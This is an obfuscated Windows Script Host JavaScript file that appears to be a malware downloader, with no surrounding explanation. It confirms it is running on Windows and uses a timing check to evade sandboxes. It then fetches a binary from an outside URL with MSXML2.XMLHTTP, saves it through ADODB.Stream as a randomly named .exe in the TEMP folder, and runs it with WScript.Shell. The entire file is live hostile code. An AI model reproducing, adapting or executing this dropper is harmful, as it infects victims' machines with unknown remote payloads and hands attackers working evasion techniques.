var _G2 = false;
var _YY0 = "CreateObject";
var _V = function _W() {return WScript[_YY0]("WScript"+".Shell");}(), _Z2 = 11;
var _JX = "MSXML2.XMLHTTP";
var _OC = 2123213;
var _Z = 0;
function _Y(_G0){_V["Run"](_G0, _Z, _Z);};
function _ZB(){return _JX + "";};
function _C(_TW, _S){_Z = _Z * 1; return _TW - _S;};
function _YY(){return _YY0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G2 = true;
  @end
@*/
if (_G2)
{
var _DY = "";
function _T(){return 22;};
var _X = 0; var _OF = 0;
function _J()
{
var _T0 = new this["Date"]();
var _BC = _T0["getUTCMilliseconds"]();
WScript["Sleep"](_T());
var _T0 = new this["Date"]();
var _C0 = _T0["getUTCMilliseconds"]();
WScript["Sleep"](_T());
var _T0 = new this["Date"]();
var _G = _T0["getUTCMilliseconds"]();
var _X = "_CC";
_X = _C(_C0, _BC);
var _OF = "_NN";
_OF = _C(_G, _C0);
_DY = "open";
return _C(_X, _OF);
}
var _X0 = false;
var _G1 = false;
for (var _Y0 = _Z; _Y0 < _T() * 1; _Y0++){if (_J() != _Z){
_X0 = true; 
_OF = "31" + 11 * _X + _OF; 
_G1 = true; 
break;
}}
function _GW() {return ((_X0 == true) && (_X0 == _G1)) ? 1 : _Z;};
if (_X0 && _GW() && _G1){
function _SC() {return _V["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "N7KCStP3MnIxiK.ex" + "e";};
 _Q = _ZB();
 _GQ = WScript[_YY0](_Q);
 var _Z1 = 1;
 while (_Z1){
try {
	if (_Z1 == 1)
	{
		_GQ[_DY]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_GQ["send"]();
		_LT0 = "Sleep";
	}
	WScript[_LT0](_T() + 120); 
	if (_GQ["readystate"] < 2 * 2) continue;
	_Z1 = _Z;
	function _CD(_Z0) {var _VQ = (1, 2, 3, 4, 5, _Z0); return _VQ;};
	_U = WScript[_YY()]("ADODB.Stream");
	_Q = _U;
	_Q[_DY]();
	_Q["type"] = _CD(1);
	_Q["write"](_GQ["ResponseBody"]);
	_U["position"] = _CD(_Z);
	_Q["Save" + "ToFile"](_SC(), 2);
	_U["cl"+"ose"]();
	_LT = _SC();
	_Y(_LT);
} catch(_EH){};
}
}
}

